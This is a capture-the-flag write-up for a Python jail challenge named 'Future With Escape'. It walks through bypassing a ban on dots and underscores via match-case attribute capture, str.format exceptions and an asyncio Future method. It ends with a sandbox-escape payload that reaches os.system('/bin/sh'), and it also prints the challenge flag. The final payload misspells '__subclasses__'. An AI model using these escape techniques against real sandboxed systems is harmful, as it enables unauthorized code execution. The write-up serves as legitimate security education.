# Future With Escape

## Description

There was an exit

## Writeup

In this challenge, the biggest limitation is the inability to use `.`. Looking at the [pyjail cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/#getting-attributes), we can see that there are various methods of accessing attributes. Let’s focus on one of them:

```python
match ():
    case object(__doc__=a):
        pass
print(a) # ().__doc__
```

Instead of `object`, you can also use another class, but in that case you can only extract attributes that belong to instances of that class.

`Future.__class__` is equal to `type`. This `type` is both a class and also a function that returns the class of an object when called as `type(obj)`. Therefore, running `future('__class__', obj)` will give you a reference to the class of `obj`.

Using this, for example, you can execute `"foobar".encode("utf-8")` as follows:
```python
str = future("\x5f\x5fclass\x5f\x5f", "")
type = future("\x5f\x5fclass\x5f\x5f", str)
match str:
    case type(encode=encode):
        pass
# str.encode("foobar", "utf-8") is the same as "foobar.encode("utf-8")
encode("foobar", "utf-8")
```

However, since `_` cannot be used, this method cannot access dunder attributes or methods such as `__subclasses__`, making it difficult to escalate all the way to RCE. For that, we need to use a second method of attribute access.

```python
try:
  "{0.__doc__.lol}".format(())
except Exception as e:
  a = e.obj
  print(a) # ().__doc__
```

By combining this with the first method, we can obtain `str.format`, and we can also access `e.obj`. If we can obtain an `Exception` or `BaseException` object, it should be possible to access dunder functions through this technique. (Note: in `except ... as e`, the `...` must be an instance of a class that inherits `BaseException`, otherwise a runtime error will occur.)

[`Future._make_cancelled_error`](https://github.com/python/cpython/blob/95d6e0b2830c8e6bfd861042f6df6343891d5843/Lib/asyncio/futures.py#L135) is a function that returns a `CancelledError` object, which can be obtained with `future("_make_cancelled_error", fut)`. Since `CancelledError` inherits from `BaseException`, `CancelledError.mro()` returns `[CancelledError, BaseException, object]`. By applying `pop` to this list, we can obtain references to `object` and `BaseException` in turn.

As a result, we are now able to access arbitrary attributes. From here, we just need to execute code equivalent to

```python
object.__subclassess__().__getitem__(190).__init__.__globals__.get("system")("/bin/sh")
```

## Flag

`fwectf{y0u_c4n_35c4p3_fr0m_j41l_bu7_n07_fu7ur3}`

